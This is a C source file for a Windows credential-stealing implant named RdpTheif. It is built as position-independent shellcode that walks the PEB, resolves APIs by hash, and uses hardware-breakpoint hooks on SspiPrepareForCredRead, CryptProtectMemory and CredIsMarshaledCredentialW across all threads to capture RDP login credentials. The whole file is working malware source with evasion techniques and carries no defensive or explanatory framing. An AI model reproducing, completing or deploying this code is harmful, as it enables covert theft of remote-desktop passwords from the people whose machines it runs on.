#include "main.h"

FUNC int ConfigureGlobalInstance() {
    BUFFER      Base = { 0 };
    PVOID       Heap     = { 0 };
    PVOID       MmAddr   = { 0 };
    SIZE_T      MmSize   = { 0 };
    WINAPIS     APIS = { 0 };
    ULONG       Protect  = { 0 };

    CW32_PPEB pPEB  = (CW32_PPEB)__readgsqword(0x60);
    Heap            = pPEB->ProcessHeap;

    Base.Buffer = StRipStart();
    Base.Length = U_PTR( StRipEnd() ) - U_PTR( Base.Buffer );

    MmAddr = Base.Buffer + InstanceOffset();
    MmSize = sizeof( PVOID );

    APIS.HandlesDll.ntdll       = GetModuleHandleC(HASH_ntdll);
    APIS.HandlesDll.kernel32    = GetModuleHandleC(HASH_kernel32);

    APIS.NtdllDll.RtlAllocateHeap           = GetProcAddressC(APIS.HandlesDll.ntdll, HASH_RtlAllocateHeap);
    APIS.NtdllDll.NtProtectVirtualMemory    = GetProcAddressC(APIS.HandlesDll.ntdll, HASH_NtProtectVirtualMemory);

    if ( ! NT_SUCCESS( APIS.NtdllDll.NtProtectVirtualMemory(((HANDLE)(LONG_PTR)-1), &MmAddr, &MmSize, PAGE_READWRITE, &Protect) ) ) {
        return FALSE;
    }

    if ( ! ( C_DEF( MmAddr ) = APIS.NtdllDll.RtlAllocateHeap( Heap, HEAP_ZERO_MEMORY, sizeof( WINAPIS ) ) ) ) {
        return FALSE;
    }

    MmCopy( C_DEF( MmAddr ), &APIS, sizeof( WINAPIS ) );
    MmZero( & APIS, sizeof( WINAPIS ) );
    MmZero( C_PTR( U_PTR( MmAddr ) + sizeof( PVOID ) ), 0x18 );

    return TRUE;
}

EXTERN_C FUNC int RdpTheif() {
    if (!ConfigureGlobalInstance()) {
        return FALSE;
    }

    MAIN_INSTANCE

    InitializeApis();

    if (!InitializeHWBPEngine())
        return FALSE;
    if (!InstallHWBPHook((uintptr_t)SspiPrepareForCredRead_, Dr0, _SspiPrepareForCredRead, ALL_THREADS))
        return FALSE;
    if (!InstallHWBPHook((uintptr_t)CryptProtectMemory_, Dr1, _CryptProtectMemory, ALL_THREADS))
        return FALSE;
    if (!InstallHWBPHook((uintptr_t)CredIsMarshaledCredentialW_, Dr2, _CredIsMarshaledCredentialW, ALL_THREADS))
        return FALSE;

    return 0;

}